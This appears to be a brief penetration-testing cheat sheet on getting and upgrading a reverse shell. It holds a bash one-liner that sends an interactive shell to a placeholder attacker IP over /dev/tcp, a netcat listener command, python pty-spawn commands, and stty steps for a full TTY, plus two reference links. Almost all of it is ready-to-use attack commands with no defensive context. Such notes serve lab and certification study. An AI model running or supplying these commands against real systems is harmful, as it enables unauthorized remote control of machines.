
```
bash -c 'bash -i >& /dev/tcp/<attackerIP>/9001 0>&1'
```

```
nc -lvnp 9001
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

CTRL + Z
stty raw -echo
fg
<return>
export TERM=xterm

https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/


```
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```

